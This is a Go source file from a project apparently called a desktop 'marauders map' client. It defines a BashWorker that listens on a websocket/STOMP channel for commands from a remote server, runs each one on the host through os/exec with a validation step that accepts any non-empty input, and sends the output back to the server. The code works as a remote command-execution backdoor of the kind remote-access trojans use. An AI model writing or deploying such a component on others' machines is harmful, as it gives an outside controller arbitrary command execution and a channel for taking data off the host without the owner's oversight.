package internal

import (
	"encoding/json"
	"log"
	"marauders-map-client-desktop/tools"
	"os/exec"
	"strings"

	gostompclient "github.com/apal7/go-stomp-client"
)

type BashWorker struct {
	running     bool
	channelOpen bool

	ch  chan *gostompclient.Frame
	wsc *WSClient
}

type Command struct {
	program      string
	prograparams []string
}

func (w *BashWorker) GetChannel() chan *gostompclient.Frame {
	return w.ch
}

func (w *BashWorker) SetChannel(ch chan *gostompclient.Frame) {
	w.ch = ch
}

func (w *BashWorker) Start() {
	if w.running {
		return
	}

	if w.ch == nil || !w.channelOpen {
		w.SetupChannel()
	}

	w.running = true
	go func() {
		for w.running {
			log.Println("BashWorker - waiting for frame")
			frame := <-w.ch
			log.Println("Frame received:", string(frame.Body))

			w.ProcessFrame(frame)
		}
	}()
}

// Transform and process the frame
func (w *BashWorker) ProcessFrame(frame *gostompclient.Frame) {
	cmd := frame.GetBody()

	var bashreq BashRequest
	err := json.Unmarshal(cmd, &bashreq)
	if err != nil {
		log.Printf("Error unmarshaling BashRequest. Tryed to unmarshal: #%s#\n", cmd)
		log.Println(err)
		return
	}

	w.ProcessRequest(bashreq)
}

// Process the BashRequest and execute shell command
func (w *BashWorker) ProcessRequest(bashreq BashRequest) {
	if !w.ValidateCommand(bashreq.BashCommand) {
		return
	}

	command := w.PrepareCommand(bashreq.BashCommand)
	if command == nil {
		return
	}

	cmdres := exec.Command(command.program, command.prograparams...)
	stdout, err := cmdres.Output()
	if err != nil {
		log.Printf("Error executing the shell command: %s\n", err.Error())
		return
	}

	log.Printf("Command execution result:\n%s\n", stdout)
	w.SendToServerBashResult(bashreq.Reqid, stdout)
}

// Check if is a valid command
func (w *BashWorker) SendToServerBashResult(reqId string, bashresults []byte) {
	bashResponse := &BashResponse{
		Reqid:       reqId,
		BashResults: string(bashresults),
	}

	bashResponseM, err := json.Marshal(bashResponse)
	if err != nil {
		log.Println("Error marshaling bashResponse. Can't send results back to server")
		return
	}

	w.wsc.Send("/app/marauder/bash/res", bashResponseM)
	log.Println("Bash results sent")
}

// Check if is a valid command
func (w *BashWorker) ValidateCommand(bashcmd string) bool {
	cmd := strings.Split(tools.CleanWhiteSpaces(bashcmd), " ")

	if len(cmd) <= 0 {
		return false
	}

	return true
}

// Creates a Command struct that holds the shell command
func (w *BashWorker) PrepareCommand(bashcmd string) *Command {
	if !w.ValidateCommand(bashcmd) {
		return nil
	}

	cmd := strings.Split(tools.CleanWhiteSpaces(bashcmd), " ")

	program := cmd[0]
	var programparams []string

	// Set params if we have
	if len(cmd) > 1 {
		programparams = cmd[1:]
	} else {
		programparams = nil
	}

	return &Command{
		program:      program,
		prograparams: programparams,
	}
}

func (w *BashWorker) Stop() {
	w.running = false
	log.Println("BashWorker - stopped")
}

func (w *BashWorker) SetupChannel() {
	w.ch = make(chan *gostompclient.Frame)
	w.channelOpen = true
}

func NewBashWorker(wsc *WSClient) *BashWorker {
	bworker := &BashWorker{
		wsc: wsc,
	}

	bworker.SetupChannel()

	return bworker
}
